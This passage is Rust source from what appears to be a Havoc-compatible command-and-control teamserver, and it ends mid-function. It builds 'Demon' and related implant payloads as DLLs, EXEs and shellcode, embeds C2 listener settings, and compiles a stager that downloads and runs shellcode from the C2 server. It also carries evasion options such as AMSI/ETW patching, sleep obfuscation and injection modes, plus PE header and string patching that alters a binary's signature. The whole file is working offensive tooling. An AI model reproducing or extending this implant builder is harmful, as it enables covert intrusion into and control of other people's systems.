//! Havoc-compatible Demon payload compilation support.

mod build_defs;
mod cache;
mod config_values;
mod demon_config;
mod formats;
mod rust_agent;
mod toolchain;

use build_defs::{
    build_defines, build_stager_defines, default_compiler_flags, main_args, stager_cache_bytes,
};
pub use cache::PayloadCache;
use cache::compute_cache_key;
#[cfg(test)]
use config_values::{
    add_bytes, add_u32, add_u64, add_wstring, amsi_patch_value, injection_mode, optional_bool,
    optional_string, parse_hour_minute, parse_kill_date, parse_working_hours, proxy_loading_value,
    proxy_url, required_object, required_string, required_u32, sleep_jump_bypass,
    sleep_obfuscation_value,
};
use demon_config::{merged_request_config, pack_config};
use formats::{Architecture, OutputFormat};
pub use toolchain::ToolchainVersion;
use toolchain::{
    GCC_MIN_VERSION, NASM_MIN_VERSION, Toolchain, parse_gcc_version, parse_nasm_version,
    resolve_executable, run_version_command, verify_tool_version_with,
};

use std::ffi::OsString;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::Arc;

#[cfg(test)]
use red_cell_common::HttpListenerConfig;
use red_cell_common::ListenerConfig;
use red_cell_common::config::{BinaryConfig, DemonConfig, Profile};
use red_cell_common::operator::{BuildPayloadRequestInfo, CompilerDiagnostic};
use serde_json::{Map, Value};
use tempfile::TempDir;
use thiserror::Error;
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::process::Command;
use tokio::sync::mpsc;

/// Incremental console output emitted while building a Demon payload.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct BuildProgress {
    /// Havoc-style message severity label.
    pub level: String,
    /// Human-readable build output.
    pub message: String,
}

/// Compiled Demon payload bytes and metadata.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PayloadArtifact {
    /// Final payload bytes returned to the operator.
    pub bytes: Vec<u8>,
    /// Suggested output filename.
    pub file_name: String,
    /// Echoed output format string.
    pub format: String,
}

/// Errors returned by the Demon payload builder.
#[derive(Debug, Error)]
pub enum PayloadBuildError {
    /// A required compiler, source tree, or template file is unavailable.
    #[error("payload build tooling is unavailable: {message}")]
    ToolchainUnavailable { message: String },
    /// The request payload or selected listener is not supported.
    #[error("invalid payload build request: {message}")]
    InvalidRequest { message: String },
    /// JSON in the operator request could not be parsed.
    #[error("failed to parse payload build configuration: {0}")]
    InvalidConfigJson(#[from] serde_json::Error),
    /// An I/O operation failed while compiling or reading artifacts.
    #[error("payload build I/O failed: {0}")]
    Io(#[from] std::io::Error),
    /// A compiler process exited unsuccessfully.
    #[error("payload build command failed: {command}")]
    CommandFailed {
        command: String,
        /// Structured diagnostics parsed from the compiler's stderr output.
        diagnostics: Vec<CompilerDiagnostic>,
    },
}

/// Teamserver service responsible for compiling Havoc-compatible Demon payloads.
#[derive(Clone, Debug)]
pub struct PayloadBuilderService {
    pub(crate) inner: Arc<PayloadBuilderInner>,
}

/// Per-request agent identity passed through the private build pipeline.
struct AgentBuildContext<'a> {
    /// Lowercase agent name used in output file names (e.g. `"demon"`, `"archon"`).
    name: &'a str,
    /// Root of the agent C/ASM source tree to compile.
    source_root: &'a Path,
}

#[derive(Clone, Debug)]
pub(crate) struct PayloadBuilderInner {
    toolchain: Toolchain,
    source_root: PathBuf,
    /// Source root for the Archon agent fork — points at `agent/archon/`.
    archon_source_root: PathBuf,
    /// Source root for the Phantom Rust agent — points at `agent/phantom/`.
    phantom_source_root: PathBuf,
    /// Source root for the Specter Rust agent — points at `agent/specter/`.
    specter_source_root: PathBuf,
    shellcode_x64_template: PathBuf,
    shellcode_x86_template: PathBuf,
    /// Pre-compiled DllLdr position-independent loader (x64 only).
    /// Prepended to the Demon DLL to produce the Raw Shellcode format.
    dllldr_x64_template: PathBuf,
    /// C source template compiled standalone for the Staged Shellcode format.
    stager_template: PathBuf,
    default_demon: DemonConfig,
    binary_patch: Option<BinaryConfig>,
    pub(crate) cache: PayloadCache,
}

impl PayloadBuilderService {
    /// Resolve the MinGW/NASM toolchain and Havoc payload source tree from `profile`.
    pub fn from_profile(profile: &Profile) -> Result<Self, PayloadBuildError> {
        let repo_root = workspace_root()?;
        Self::from_profile_with_repo_root(profile, &repo_root)
    }

    fn from_profile_with_repo_root(
        profile: &Profile,
        repo_root: &Path,
    ) -> Result<Self, PayloadBuildError> {
        Self::from_profile_with_repo_root_impl(profile, repo_root, run_version_command)
    }

    /// Inner constructor that accepts a custom version-output function so that
    /// tests can avoid subprocess spawns entirely.
    fn from_profile_with_repo_root_impl(
        profile: &Profile,
        repo_root: &Path,
        version_output_fn: fn(&Path) -> Result<String, PayloadBuildError>,
    ) -> Result<Self, PayloadBuildError> {
        let build = profile.teamserver.build.as_ref();

        let compiler_x64 = resolve_executable(
            build.and_then(|config| config.compiler64.as_deref()),
            "x86_64-w64-mingw32-gcc",
            Some(repo_root),
        )?;
        let compiler_x64_version = verify_tool_version_with(
            &compiler_x64,
            parse_gcc_version,
            &GCC_MIN_VERSION,
            version_output_fn,
        )?;

        let compiler_x86 = resolve_executable(
            build.and_then(|config| config.compiler86.as_deref()),
            "i686-w64-mingw32-gcc",
            Some(repo_root),
        )?;
        let compiler_x86_version = verify_tool_version_with(
            &compiler_x86,
            parse_gcc_version,
            &GCC_MIN_VERSION,
            version_output_fn,
        )?;

        let nasm = resolve_executable(
            build.and_then(|config| config.nasm.as_deref()),
            "nasm",
            Some(repo_root),
        )?;
        let nasm_version = verify_tool_version_with(
            &nasm,
            parse_nasm_version,
            &NASM_MIN_VERSION,
            version_output_fn,
        )?;

        tracing::info!(
            compiler_x64 = %compiler_x64.display(),
            compiler_x64_version = %compiler_x64_version,
            compiler_x86 = %compiler_x86.display(),
            compiler_x86_version = %compiler_x86_version,
            nasm = %nasm.display(),
            nasm_version = %nasm_version,
            "payload build toolchain discovered and verified"
        );

        let toolchain = Toolchain {
            compiler_x64,
            compiler_x64_version,
            compiler_x86,
            compiler_x86_version,
            nasm,
            nasm_version,
        };

        let source_root = repo_root.join("src/Havoc/payloads/Demon");
        let archon_source_root = repo_root.join("agent/archon");
        let shellcode_x64_template = repo_root.join("src/Havoc/payloads/Shellcode.x64.bin");
        let shellcode_x86_template = repo_root.join("src/Havoc/payloads/Shellcode.x86.bin");
        let dllldr_x64_template = repo_root.join("src/Havoc/payloads/DllLdr.x64.bin");
        let stager_template = repo_root.join("payloads/templates/MainStager.c");

        for required_path in [
            &source_root,
            &shellcode_x64_template,
            &shellcode_x86_template,
            &dllldr_x64_template,
            &stager_template,
        ] {
            if !required_path.exists() {
                return Err(PayloadBuildError::ToolchainUnavailable {
                    message: format!("required payload asset missing: {}", required_path.display()),
                });
            }
        }

        // Archon/Phantom/Specter source roots are optional at startup — they
        // may not be present on all developer machines.  A missing source tree
        // is only an error when an operator actually requests that agent type.
        let phantom_source_root = repo_root.join("agent/phantom");
        let specter_source_root = repo_root.join("agent/specter");

        let cache = PayloadCache::new(repo_root.join("target/payload-cache"));

        Ok(Self {
            inner: Arc::new(PayloadBuilderInner {
                toolchain,
                source_root,
                archon_source_root,
                phantom_source_root,
                specter_source_root,
                shellcode_x64_template,
                shellcode_x86_template,
                dllldr_x64_template,
                stager_template,
                default_demon: profile.demon.clone(),
                binary_patch: profile.demon.binary.clone(),
                cache,
            }),
        })
    }

    /// Compile a Demon payload for `listener` using the operator `request`.
    ///
    /// If a cached artifact exists for the same inputs, the compilation is
    /// skipped and the cached bytes are returned immediately.
    pub async fn build_payload<F>(
        &self,
        listener: &ListenerConfig,
        request: &BuildPayloadRequestInfo,
        mut progress: F,
    ) -> Result<PayloadArtifact, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        // Resolve the agent name and source root for this build request.
        let agent_type = request.agent_type.trim();

        // Phantom and Specter are Rust agents with a fundamentally different
        // build pipeline (cargo build instead of C/ASM cross-compilation).
        // Route them to the dedicated Rust-agent builder and return early.
        match agent_type {
            "Phantom" => {
                return self
                    .build_rust_agent(
                        listener,
                        "phantom",
                        &self.inner.phantom_source_root,
                        "x86_64-unknown-linux-gnu",
                        "",
                        &mut progress,
                    )
                    .await;
            }
            "Specter" => {
                return self
                    .build_rust_agent(
                        listener,
                        "specter",
                        &self.inner.specter_source_root,
                        "x86_64-pc-windows-gnu",
                        ".exe",
                        &mut progress,
                    )
                    .await;
            }
            _ => {}
        }

        let (agent_name, source_root) = match agent_type {
            "Demon" => ("demon", &self.inner.source_root),
            "Archon" => {
                if !self.inner.archon_source_root.exists() {
                    return Err(PayloadBuildError::ToolchainUnavailable {
                        message: format!(
                            "Archon source tree not found at {}",
                            self.inner.archon_source_root.display()
                        ),
                    });
                }
                ("archon", &self.inner.archon_source_root)
            }
            other => {
                return Err(PayloadBuildError::InvalidRequest {
                    message: format!("unsupported agent type `{other}`"),
                });
            }
        };

        let architecture = Architecture::parse(&request.arch)?;
        let format = OutputFormat::parse(&request.format)?;

        // The staged shellcode stager does not embed a Demon config — it only
        // needs the C2 connection parameters from the listener.  Route it to a
        // separate fast path that bypasses pack_config entirely.
        if format == OutputFormat::StagedShellcode {
            return self
                .build_staged_payload(listener, architecture, &request.format, &mut progress)
                .await;
        }

        let config = merged_request_config(&request.config, agent_name, &self.inner.default_demon)?;

        // Compute the packed config bytes that will be embedded in the compiled
        // binary. Using these as part of the cache key ensures that any change
        // to the listener or demon configuration produces a distinct cache entry.
        let config_bytes = pack_config(listener, &config)?;
        let cache_key = compute_cache_key(
            agent_name,
            architecture,
            format,
            &config_bytes,
            self.inner.binary_patch.as_ref(),
        )?;

        if let Some(cached) = self.inner.cache.get(&cache_key).await {
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: "cache hit — returning cached artifact".to_owned(),
            });
            let file_name =
                format!("{agent_name}{}{}", architecture.suffix(), format.file_extension());
            return Ok(PayloadArtifact {
                bytes: cached,
                file_name,
                format: request.format.clone(),
            });
        }

        progress(BuildProgress { level: "Info".to_owned(), message: "starting build".to_owned() });

        let temp_dir = TempDir::new()?;
        let agent_ctx = AgentBuildContext { name: agent_name, source_root };
        let compiled = self
            .build_impl(
                listener,
                architecture,
                format,
                &config,
                &agent_ctx,
                temp_dir.path(),
                &mut progress,
            )
            .await?;
        let file_name = format!("{agent_name}{}{}", architecture.suffix(), format.file_extension());

        self.inner.cache.put(&cache_key, &compiled).await;

        Ok(PayloadArtifact { bytes: compiled, file_name, format: request.format.clone() })
    }

    /// Return a reference to the payload artifact cache.
    pub fn cache(&self) -> &PayloadCache {
        &self.inner.cache
    }

    #[doc(hidden)]
    pub fn disabled_for_tests() -> Self {
        let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("..");
        let unknown_version =
            ToolchainVersion { major: 0, minor: 0, patch: 0, raw: "0.0.0".to_owned() };
        Self {
            inner: Arc::new(PayloadBuilderInner {
                toolchain: Toolchain {
                    compiler_x64: PathBuf::from("/nonexistent/x64-gcc"),
                    compiler_x64_version: unknown_version.clone(),
                    compiler_x86: PathBuf::from("/nonexistent/x86-gcc"),
                    compiler_x86_version: unknown_version.clone(),
                    nasm: PathBuf::from("/nonexistent/nasm"),
                    nasm_version: unknown_version,
                },
                source_root: root.join("src/Havoc/payloads/Demon"),
                archon_source_root: PathBuf::from("/nonexistent/agent/archon"),
                phantom_source_root: PathBuf::from("/nonexistent/agent/phantom"),
                specter_source_root: PathBuf::from("/nonexistent/agent/specter"),
                shellcode_x64_template: root.join("src/Havoc/payloads/Shellcode.x64.bin"),
                shellcode_x86_template: root.join("src/Havoc/payloads/Shellcode.x86.bin"),
                dllldr_x64_template: root.join("src/Havoc/payloads/DllLdr.x64.bin"),
                stager_template: root.join("payloads/templates/MainStager.c"),
                default_demon: DemonConfig {
                    sleep: None,
                    jitter: None,
                    indirect_syscall: false,
                    stack_duplication: false,
                    sleep_technique: None,
                    proxy_loading: None,
                    amsi_etw_patching: None,
                    injection: None,
                    dotnet_name_pipe: None,
                    binary: None,
                    init_secret: None,
                    init_secrets: Vec::new(),
                    trust_x_forwarded_for: false,
                    trusted_proxy_peers: Vec::new(),
                    heap_enc: true,
                    allow_legacy_ctr: false,
                },
                binary_patch: None,
                cache: PayloadCache::new(PathBuf::from("/nonexistent/payload-cache")),
            }),
        }
    }

    #[cfg(test)]
    #[allow(clippy::too_many_arguments)]
    fn with_paths_for_tests(
        toolchain: Toolchain,
        source_root: PathBuf,
        archon_source_root: PathBuf,
        shellcode_x64_template: PathBuf,
        shellcode_x86_template: PathBuf,
        dllldr_x64_template: PathBuf,
        stager_template: PathBuf,
        default_demon: DemonConfig,
        binary_patch: Option<BinaryConfig>,
        cache_dir: PathBuf,
    ) -> Self {
        Self {
            inner: Arc::new(PayloadBuilderInner {
                toolchain,
                source_root,
                archon_source_root,
                phantom_source_root: PathBuf::from("/nonexistent/agent/phantom"),
                specter_source_root: PathBuf::from("/nonexistent/agent/specter"),
                shellcode_x64_template,
                shellcode_x86_template,
                dllldr_x64_template,
                stager_template,
                default_demon,
                binary_patch,
                cache: PayloadCache::new(cache_dir),
            }),
        }
    }

    async fn build_impl<F>(
        &self,
        listener: &ListenerConfig,
        architecture: Architecture,
        format: OutputFormat,
        config: &Map<String, Value>,
        agent: &AgentBuildContext<'_>,
        compile_dir: &Path,
        progress: &mut F,
    ) -> Result<Vec<u8>, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        if format == OutputFormat::Shellcode {
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: "compiling core dll".to_owned(),
            });
            let dll_bytes = self
                .compile_portable_executable(
                    listener,
                    architecture,
                    OutputFormat::Dll,
                    config,
                    agent,
                    compile_dir,
                    true,
                    progress,
                )
                .await?;
            let template = tokio::fs::read(match architecture {
                Architecture::X64 => &self.inner.shellcode_x64_template,
                Architecture::X86 => &self.inner.shellcode_x86_template,
            })
            .await?;

            progress(BuildProgress {
                level: "Info".to_owned(),
                message: format!("compiled core dll [{} bytes]", dll_bytes.len()),
            });

            let mut shellcode = template;
            shellcode.extend_from_slice(&dll_bytes);
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: format!("shellcode payload [{} bytes]", shellcode.len()),
            });
            progress(BuildProgress {
                level: "Good".to_owned(),
                message: "payload generated".to_owned(),
            });
            return Ok(shellcode);
        }

        if format == OutputFormat::RawShellcode {
            if architecture == Architecture::X86 {
                return Err(PayloadBuildError::InvalidRequest {
                    message:
                        "Windows Raw Shellcode requires x64 architecture: no x86 DllLdr binary \
                         is available"
                            .to_owned(),
                });
            }
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: "compiling core dll for raw shellcode".to_owned(),
            });
            let dll_bytes = self
                .compile_portable_executable(
                    listener,
                    architecture,
                    OutputFormat::Dll,
                    config,
                    agent,
                    compile_dir,
                    true,
                    progress,
                )
                .await?;
            let template = tokio::fs::read(&self.inner.dllldr_x64_template).await?;

            progress(BuildProgress {
                level: "Info".to_owned(),
                message: format!("compiled core dll [{} bytes]", dll_bytes.len()),
            });

            let mut shellcode = template;
            shellcode.extend_from_slice(&dll_bytes);
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: format!("raw shellcode payload [{} bytes]", shellcode.len()),
            });
            progress(BuildProgress {
                level: "Good".to_owned(),
                message: "payload generated".to_owned(),
            });
            return Ok(shellcode);
        }

        let bytes = self
            .compile_portable_executable(
                listener,
                architecture,
                format,
                config,
                agent,
                compile_dir,
                false,
                progress,
            )
            .await?;
        progress(BuildProgress {
            level: "Good".to_owned(),
            message: "payload generated".to_owned(),
        });
        Ok(bytes)
    }

    #[allow(clippy::too_many_arguments)]
    async fn compile_portable_executable<F>(
        &self,
        listener: &ListenerConfig,
        architecture: Architecture,
        format: OutputFormat,
        config: &Map<String, Value>,
        agent: &AgentBuildContext<'_>,
        compile_dir: &Path,
        shellcode_define: bool,
        progress: &mut F,
    ) -> Result<Vec<u8>, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        let config_bytes = pack_config(listener, config)?;
        progress(BuildProgress {
            level: "Info".to_owned(),
            message: format!("config size [{} bytes]", config_bytes.len()),
        });

        let output_path = compile_dir.join(format!(
            "{}{}{}",
            agent.name,
            architecture.suffix(),
            format.file_extension()
        ));
        let defines = build_defines(listener, config_bytes.as_slice(), shellcode_define)?;
        let object_files = self
            .compile_asm_objects(architecture, agent.source_root, compile_dir, progress)
            .await?;
        let compiler = match architecture {
            Architecture::X64 => &self.inner.toolchain.compiler_x64,
            Architecture::X86 => &self.inner.toolchain.compiler_x86,
        };

        let mut args: Vec<OsString> = Vec::new();
        args.extend(object_files.into_iter().map(|path| path.into_os_string()));
        for path in c_sources(agent.source_root)? {
            args.push(
                path.strip_prefix(agent.source_root)
                    .map_err(|source| PayloadBuildError::ToolchainUnavailable {
                        message: format!(
                            "failed to relativize source path {}: {source}",
                            path.display()
                        ),
                    })?
                    .as_os_str()
                    .to_os_string(),
            );
        }
        args.push(OsString::from("src/Demon.c"));
        args.push(OsString::from("-Iinclude"));
        args.extend(default_compiler_flags(format).into_iter().map(OsString::from));
        args.extend(defines.into_iter().map(|define| OsString::from(format!("-D{define}"))));
        args.extend(main_args(architecture, format).into_iter().map(OsString::from));
        args.push(OsString::from("-o"));
        args.push(output_path.as_os_str().to_os_string());

        progress(BuildProgress {
            level: "Info".to_owned(),
            message: "compiling source".to_owned(),
        });
        run_command(compiler, &args, agent.source_root, progress).await?;
        progress(BuildProgress {
            level: "Info".to_owned(),
            message: "finished compiling source".to_owned(),
        });

        let mut payload = tokio::fs::read(&output_path).await?;
        if let Some(binary_patch) = &self.inner.binary_patch {
            payload = patch_payload(payload, architecture, binary_patch)?;
        }
        Ok(payload)
    }

    async fn compile_asm_objects<F>(
        &self,
        architecture: Architecture,
        source_root: &Path,
        compile_dir: &Path,
        progress: &mut F,
    ) -> Result<Vec<PathBuf>, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        let mut objects = Vec::new();

        for source in asm_sources(source_root, architecture)? {
            let file_stem =
                source.file_stem().and_then(|value| value.to_str()).ok_or_else(|| {
                    PayloadBuildError::ToolchainUnavailable {
                        message: format!("invalid assembly source file name {}", source.display()),
                    }
                })?;
            let object_path = compile_dir.join(format!("{file_stem}.o"));
            let relative = source.strip_prefix(source_root).map_err(|error| {
                PayloadBuildError::ToolchainUnavailable {
                    message: format!(
                        "failed to relativize assembly source {}: {error}",
                        source.display()
                    ),
                }
            })?;

            run_command(
                &self.inner.toolchain.nasm,
                &[
                    OsString::from("-f"),
                    OsString::from(architecture.nasm_format()),
                    relative.as_os_str().to_os_string(),
                    OsString::from("-o"),
                    object_path.as_os_str().to_os_string(),
                ],
                source_root,
                progress,
            )
            .await?;
            objects.push(object_path);
        }

        Ok(objects)
    }

    /// Build path for the staged shellcode format.
    ///
    /// The stager does not embed a Demon config — it only needs the C2
    /// connection parameters.  The cache key is derived from the listener
    /// connection info so that re-builds with the same listener are cached.
    async fn build_staged_payload<F>(
        &self,
        listener: &ListenerConfig,
        architecture: Architecture,
        format_str: &str,
        progress: &mut F,
    ) -> Result<PayloadArtifact, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        let stager_key_bytes = stager_cache_bytes(listener)?;
        // Staged shellcode stagers are always built from the Demon source tree.
        let cache_key = compute_cache_key(
            "demon",
            architecture,
            OutputFormat::StagedShellcode,
            &stager_key_bytes,
            None,
        )?;

        if let Some(cached) = self.inner.cache.get(&cache_key).await {
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: "cache hit — returning cached artifact".to_owned(),
            });
            let file_name = format!(
                "demon{}{}",
                architecture.suffix(),
                OutputFormat::StagedShellcode.file_extension()
            );
            return Ok(PayloadArtifact { bytes: cached, file_name, format: format_str.to_owned() });
        }

        progress(BuildProgress {
            level: "Info".to_owned(),
            message: "starting stager build".to_owned(),
        });

        let temp_dir = TempDir::new()?;
        let compiled =
            self.compile_stager(listener, architecture, temp_dir.path(), progress).await?;
        let file_name = format!(
            "demon{}{}",
            architecture.suffix(),
            OutputFormat::StagedShellcode.file_extension()
        );

        self.inner.cache.put(&cache_key, &compiled).await;

        Ok(PayloadArtifact { bytes: compiled, file_name, format: format_str.to_owned() })
    }

    /// Compile the staged shellcode stager from `payloads/templates/MainStager.c`.
    ///
    /// The stager is a standalone Windows EXE that downloads the Demon
    /// shellcode payload from the C2 listener at run time and executes it.
    /// It is compiled without the Demon source tree.
    async fn compile_stager<F>(
        &self,
        listener: &ListenerConfig,
        architecture: Architecture,
        compile_dir: &Path,
        progress: &mut F,
    ) -> Result<Vec<u8>, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        let template_dst = compile_dir.join("MainStager.c");
        tokio::fs::copy(&self.inner.stager_template, &template_dst).await?;

        let defines = build_stager_defines(listener)?;

        let output_path = compile_dir.join(format!(
            "stager{}{}",
            architecture.suffix(),
            OutputFormat::StagedShellcode.file_extension()
        ));

        let compiler = match architecture {
            Architecture::X64 => &self.inner.toolchain.compiler_x64,
            Architecture::X86 => &self.inner.toolchain.compiler_x86,
        };

        let entry = if architecture == Architecture::X64 { "WinMain" } else { "_WinMain" };

        let mut args: Vec<OsString> = vec![
            OsString::from("MainStager.c"),
            OsString::from("-Os"),
            OsString::from("-s"),
            OsString::from("-mwindows"),
            OsString::from("-lwininet"),
            OsString::from("-Wl,--gc-sections"),
        ];
        args.extend(defines.into_iter().map(|d| OsString::from(format!("-D{d}"))));
        args.push(OsString::from("-e"));
        args.push(OsString::from(entry));
        args.push(OsString::from("-o"));
        args.push(output_path.as_os_str().to_os_string());

        progress(BuildProgress {
            level: "Info".to_owned(),
            message: "compiling stager".to_owned(),
        });
        run_command(compiler, &args, compile_dir, progress).await?;
        progress(BuildProgress {
            level: "Good".to_owned(),
            message: "payload generated".to_owned(),
        });

        Ok(tokio::fs::read(&output_path).await?)
    }
}

pub(crate) fn workspace_root() -> Result<PathBuf, PayloadBuildError> {
    let manifest_dir = Path::new(env!("CARGO_MANIFEST_DIR"));
    let workspace_root =
        manifest_dir.parent().ok_or_else(|| PayloadBuildError::ToolchainUnavailable {
            message: format!(
                "failed to resolve repository root: manifest directory `{}` has no parent",
                manifest_dir.display()
            ),
        })?;
    workspace_root.canonicalize().map_err(|source| PayloadBuildError::ToolchainUnavailable {
        message: format!("failed to resolve repository root: {source}"),
    })
}

/// Tag identifying which stream a line originated from.
enum StreamTag {
    Stdout,
    Stderr,
}

async fn run_command<F>(
    program: &Path,
    args: &[OsString],
    cwd: &Path,
    progress: &mut F,
) -> Result<(), PayloadBuildError>
where
    F: FnMut(BuildProgress),
{
    let command_line = std::iter::once(program.display().to_string())
        .chain(args.iter().map(|arg| arg.to_string_lossy().into_owned()))
        .collect::<Vec<_>>()
        .join(" ");
    progress(BuildProgress { level: "Info".to_owned(), message: command_line.clone() });

    let mut command = Command::new(program);
    command.args(args).current_dir(cwd).stdout(Stdio::piped()).stderr(Stdio::piped());
    let mut child = command.spawn()?;
    let stdout = child
        .stdout
        .take()
        .ok_or_else(|| PayloadBuildError::Io(std::io::Error::other("missing child stdout")))?;
    let stderr = child
        .stderr
        .take()
        .ok_or_else(|| PayloadBuildError::Io(std::io::Error::other("missing child stderr")))?;

    // Use a tagged channel so stdout and stderr lines can be handled differently.
    // Stderr lines are collected for diagnostic parsing on failure.
    let (sender, mut receiver) = mpsc::unbounded_channel::<(StreamTag, String)>();
    let stdout_sender = sender.clone();
    let stderr_sender = sender;

    let stdout_task = tokio::spawn(async move {
        let mut lines = BufReader::new(stdout).lines();
        while let Some(line) = lines.next_line().await? {
            let _ = stdout_sender.send((StreamTag::Stdout, line));
        }
        Ok::<(), std::io::Error>(())
    });
    let stderr_task = tokio::spawn(async move {
        let mut lines = BufReader::new(stderr).lines();
        while let Some(line) = lines.next_line().await? {
            let _ = stderr_sender.send((StreamTag::Stderr, line));
        }
        Ok::<(), std::io::Error>(())
    });

    let mut stderr_lines: Vec<String> = Vec::new();
    while let Some((tag, line)) = receiver.recv().await {
        if line.trim().is_empty() {
            continue;
        }
        match tag {
            StreamTag::Stdout => {
                progress(BuildProgress { level: "Info".to_owned(), message: line });
            }
            StreamTag::Stderr => {
                stderr_lines.push(line.clone());
                // Forward stderr as a warning so the operator sees it in real time.
                progress(BuildProgress { level: "Warning".to_owned(), message: line });
            }
        }
    }

    let status = child.wait().await?;
    stdout_task.await.map_err(|source| PayloadBuildError::Io(std::io::Error::other(source)))??;
    stderr_task.await.map_err(|source| PayloadBuildError::Io(std::io::Error::other(source)))??;

    if status.success() {
        Ok(())
    } else {
        let diagnostics =
            stderr_lines.iter().filter_map(|l| parse_compiler_diagnostic(l)).collect();
        Err(PayloadBuildError::CommandFailed { command: command_line, diagnostics })
    }
}

/// Try to parse a single line of GCC or NASM compiler output as a structured diagnostic.
///
/// Handles the common format used by both compilers on Linux:
/// - `filename:line:col: severity: message`
/// - `filename:line: severity: message`
///
/// The optional flag that GCC appends at the end of warnings (`[-Wfoo]`) is
/// extracted as `error_code` when present.
pub fn parse_compiler_diagnostic(line: &str) -> Option<CompilerDiagnostic> {
    let line = line.trim_start();

    // Find the first colon that terminates the filename. On Linux, source paths
    // do not contain colons, so the first colon reliably marks the boundary.
    let first_colon = line.find(':')?;
    let filename = &line[..first_colon];
    if filename.is_empty() {
        return None;
    }

    // After the first colon: line-number[:col]: severity: message
    let after_filename = &line[first_colon + 1..];
    let second_colon = after_filename.find(':')?;
    let line_num: u32 = after_filename[..second_colon].trim().parse().ok()?;

    // What follows the line number colon may be either a column number or the severity.
    let after_line = &after_filename[second_colon + 1..];
    let (column, severity_text) = {
        if let Some(next_colon) = after_line.find(':') {
            let candidate = after_line[..next_colon].trim();
            if let Ok(col) = candidate.parse::<u32>() {
                (Some(col), after_line[next_colon + 1..].trim_start())
            } else {
                (None, after_line.trim_start())
            }
        } else {
            (None, after_line.trim_start())
        }
    };

    // Severity is one of the known GCC/NASM severity labels.
    const SEVERITIES: &[&str] = &["fatal error", "error", "warning", "note"];
    let (severity, rest_after_severity) = SEVERITIES
        .iter()
        .find_map(|&sev| severity_text.strip_prefix(sev).map(|rest| (sev, rest)))?;

    // After the severity there must be a `: message`.
    let message_raw = rest_after_severity.trim_start().strip_prefix(':')?.trim();
    if message_raw.is_empty() {
        return None;
    }

    // GCC appends the triggering flag in brackets at the end of warnings, e.g.
    // `unused variable 'x' [-Wunused-variable]`.  Extract it as error_code.
    let (message, error_code) = extract_gcc_flag(message_raw);

    Some(CompilerDiagnostic {
        filename: filename.to_owned(),
        line: line_num,
        column,
        severity: severity.to_owned(),
        error_code,
        message,
    })
}

/// Extract a trailing GCC diagnostic flag from a message, if present.
///
/// GCC appends flags in the form `[-Wfoo]` or `[-Werror=foo]` at the end of
/// warning/error messages.  Returns `(message_without_flag, Some(flag))` when
/// the pattern is matched, or `(message, None)` otherwise.
fn extract_gcc_flag(message: &str) -> (String, Option<String>) {
    let trimmed = message.trim();
    if trimmed.ends_with(']') {
        if let Some(bracket_start) = trimmed.rfind('[') {
            let flag = &trimmed[bracket_start + 1..trimmed.len() - 1];
            if flag.starts_with('-') {
                let msg = trimmed[..bracket_start].trim().to_owned();
                return (msg, Some(flag.to_owned()));
            }
        }
    }
    (trimmed.to_owned(), None)
}

fn c_sources(source_root: &Path) -> Result<Vec<PathBuf>, PayloadBuildError> {
    let mut sources = Vec::new();
    for dir in ["src/core", "src/crypt", "src/inject", "src/asm"] {
        let mut entries = std::fs::read_dir(source_root.join(dir))?
            .collect::<Result<Vec<_>, _>>()?
            .into_iter()
            .map(|entry| entry.path())
            .filter(|path| path.extension().and_then(|value| value.to_str()) == Some("c"))
            .collect::<Vec<_>>();
        entries.sort();
        sources.extend(entries);
    }
    Ok(sources)
}

fn asm_sources(
    source_root: &Path,
    architecture: Architecture,
) -> Result<Vec<PathBuf>, PayloadBuildError> {
    let suffix = match architecture {
        Architecture::X64 => ".x64.asm",
        Architecture::X86 => ".x86.asm",
    };
    let mut entries = std::fs::read_dir(source_root.join("src/asm"))?
        .collect::<Result<Vec<_>, _>>()?
        .into_iter()
        .map(|entry| entry.path())
        .filter(|path| {
            path.file_name()
                .and_then(|value| value.to_str())
                .is_some_and(|name| name.contains(suffix))
        })
        .collect::<Vec<_>>();
    entries.sort();
    Ok(entries)
}

fn patch_payload(
    mut bytes: Vec<u8>,
    architecture: Architecture,
    binary_patch: &BinaryConfig,
) -> Result<Vec<u8>, PayloadBuildError> {
    // Validate PE structure before applying any patches.  A failed build step
    // may produce an ELF, error output, or a truncated file; writing PE header
    // fields into such a binary would silently corrupt it with no diagnostic.
    const MZ_MAGIC: [u8; 2] = [0x4D, 0x5A];
    if bytes.len() < 2 || bytes[..2] != MZ_MAGIC {
        return Err(PayloadBuildError::InvalidRequest {
            message: "payload does not start with MZ magic bytes — not a valid PE binary"
                .to_owned(),
        });
    }
    // pe_offsets validates the PE\0\0 signature at the DOS header pointer (0x3C).
    pe_offsets(&bytes)?;

    let header = binary_patch.header.as_ref();
    let magic = match architecture {
        Architecture::X64 => header.and_then(|header| header.magic_mz_x64.as_deref()),
        Architecture::X86 => header.and_then(|header| header.magic_mz_x86.as_deref()),
    };
    if let Some(magic) = magic {
        let patch = magic.as_bytes();
        if patch.len() > bytes.len() {
            return Err(PayloadBuildError::InvalidRequest {
                message: "binary patch header is larger than the payload".to_owned(),
            });
        }
        bytes[..patch.len()].copy_from_slice(patch);
    }

    if let Some(header) = &binary_patch.header {
        if let Some(compile_time) = header.compile_time.as_deref() {
            let timestamp = parse_header_u32_field("CompileTime", compile_time)?;
            write_pe_file_header_timestamp(&mut bytes, timestamp)?;
        }

        let image_size = match architecture {
            Architecture::X64 => header.image_size_x64,
            Architecture::X86 => header.image_size_x86,
        };
        if let Some(image_size) = image_size {
            write_pe_optional_header_image_size(&mut bytes, image_size)?;
        }
    }

    let replacements = match architecture {
        Architecture::X64 => &binary_patch.replace_strings_x64,
